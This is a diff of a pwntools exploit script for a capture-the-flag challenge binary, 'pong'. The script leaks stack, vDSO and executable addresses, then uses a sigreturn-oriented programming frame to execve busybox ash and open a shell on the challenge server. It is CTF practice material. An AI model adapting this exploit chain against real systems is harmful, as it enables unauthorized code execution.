@@ -1,79 +1,83 @@
+#!/usr/bin/env python
 from pwn import *
+import psutil
 
-context.arch = 'amd64'
+context.update(arch="amd64",os="linux")
+context.binary = exe = ELF("./pong", checksec=False)
 
-time_buffer = 1
+def get_pid_by_name(process_name):
+    for process in psutil.process_iter(attrs=['pid', 'name']):
+        if process.info['name'] == process_name:
+            return process.info['pid']
+    return None
 
-p = remote("flu.xxx", 10060)
+if args.REMOTE:
+    p = remote("flu.xxx", 10060)
+else:
+    p = remote("localhost",1440)
 
-sleep(time_buffer)
+pause() # to give it some time 
+
+# attach to process in docker
+if args.GDB:
+    gdb.attach(target=get_pid_by_name('pong'), exe='./pong', gdbscript='''
+        source /home/moody/.gdbinit-gef-docker.py
+        b *loop+52
+    ''')
+
+sleep(1)
 p.sendline(b"A"*16)
 leak = p.recv()
-stack_leak = u64(leak[8:16].ljust(8, b"\x00"))
-stack_ret = stack_leak - 0x3d5
-stack_space = stack_ret - 0x10000
 
-# vdso_base = u64(leak[80:88].ljust(8, b"\x00")) # docker gdbserver
-# exe_leak = u64(leak[160:168].ljust(8, b"\x00")) # docker gdbserver
-
-vdso_base = u64(leak[120:128].ljust(8, b"\x00")) # remote
-exe_leak = u64(leak[184:192].ljust(8, b"\x00")) # remote
+if args.REMOTE:
+    vdso_base = u64(leak[120:128].ljust(8, b"\x00"))
+    exe_leak = u64(leak[184:192].ljust(8, b"\x00"))
+    stack_leak = u64(leak[360:368].ljust(8, b"\x00"))
+else:
+    vdso_base = u64(leak[128:136].ljust(8, b"\x00"))
+    exe_leak = u64(leak[208:216].ljust(8, b"\x00"))
+    stack_leak = u64(leak[384:392].ljust(8, b"\x00"))
 
 exe_base = exe_leak - 0x40
+stack_leak = stack_leak - 0x3e9
 
-log.success(f"{hex(stack_ret)=}")
-log.success(f"{hex(stack_space)=}")
 log.success(f"{hex(vdso_base)=}")
 log.success(f"{hex(exe_base)=}")
+log.success(f"{hex(stack_leak)=}")
 
 # for i in range(0, len(leak), 8):
 #     leaks = u64(leak[i:i+8].ljust(8, b"\x00"))
 #     log.info(f"{i}: {hex(leaks)}")
 
-inc_rax = exe_base + 0x3c
-syscall = exe_base + 0x36
+inc_rax = exe_base + 0x103c
+syscall = exe_base + 0x1036
 
-read_frame = SigreturnFrame() # create bigger read cause inefficient inc rax
-read_frame.rax = 0  # read
-read_frame.rdi = 0  # stdin
-read_frame.rsi = stack_space # len of payload
-read_frame.rdx = 0x1000
-read_frame.r8 = 5
-read_frame.rbp = stack_space
-read_frame.rsp = stack_space + 0x200
-read_frame.rip = syscall
+binsh_addr = stack_leak + 376
+arg1_addr = binsh_addr + 16 # for binsh string length
 
-payload = p64(inc_rax)*15
+frame = SigreturnFrame()
+frame.rax = 0x3b  # execve
+frame.rdi = binsh_addr # /bin/busybox
+frame.rsi = arg1_addr + 8 # params[]
+frame.rdx = 0
+frame.rsp = stack_leak + 0x200 - 9
+frame.rip = syscall
+
+# call execve("/bin/busybox", ["ash"],0)
+
+payload = p64(inc_rax)*0xf
 payload += p64(syscall)
-payload += bytes(read_frame)
-payload += p64(stack_space+0x200)
+payload += bytes(frame)
+payload += b'/bin/busybox\x00'.ljust(16, b'\x00')
+payload += b'ash\x00'.ljust(8,b'\x00')
+payload += p64(arg1_addr) # params
+payload += p64(0)
 
-for i in range(0, len(payload), 8):
-    payloads = u64(payload[i:i+8].ljust(8, b"\x00"))
-    log.info(f"{int(i/8)}: {hex(payloads)}")
-
-sleep(time_buffer)
-p.sendline(b"B"*504 + b"/flag" + b"\x00")
-log.info(b"sent two")
-
-sleep(time_buffer)
-p.sendline(b"C"*496 + b"r" + b"\x00")
-log.info(b"sent three")
-
-sleep(time_buffer)
+p.sendline(b"A"*8)
+p.recv()
+p.sendline(b"B"*4)
+p.recv()
+sleep(1)
 p.sendline(payload)
-log.info(b"sent payload")
-
-open_frame = SigreturnFrame()
-open_frame.rax = 0  # read
-open_frame.rdi = 0  # stdin
-open_frame.rsi = stack_space # len of payload
-open_frame.rdx = 0x1000
-open_frame.r8 = 5
-open_frame.rbp = stack_space + 0x5000
-open_frame.rsp = stack_space + 0x5200
-open_frame.rip = syscall
-
-sleep(time_buffer)
 
 p.interactive()
